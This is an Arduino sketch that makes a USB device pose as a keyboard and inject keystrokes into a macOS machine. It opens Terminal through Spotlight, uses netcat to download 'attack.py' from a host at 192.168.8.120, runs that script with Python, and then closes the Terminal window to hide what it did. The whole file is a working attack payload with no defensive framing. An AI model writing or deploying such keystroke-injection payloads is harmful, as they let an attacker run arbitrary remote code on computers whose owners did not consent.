#include <HID-Project.h>
#include <HID-Settings.h>

void setup()
{
  // Start Keyboard
  Keyboard.begin();

  // Start Payload
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(5000);

  Keyboard.print("nc 192.168.8.120 8888 > attack.py");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(20000);
  
  Keyboard.print("python attack.py");
  
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(10000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(113);
  Keyboard.releaseAll();

  // End Payload

  // Stop Keyboard
  Keyboard.end();
}

// Unused
void loop() {}
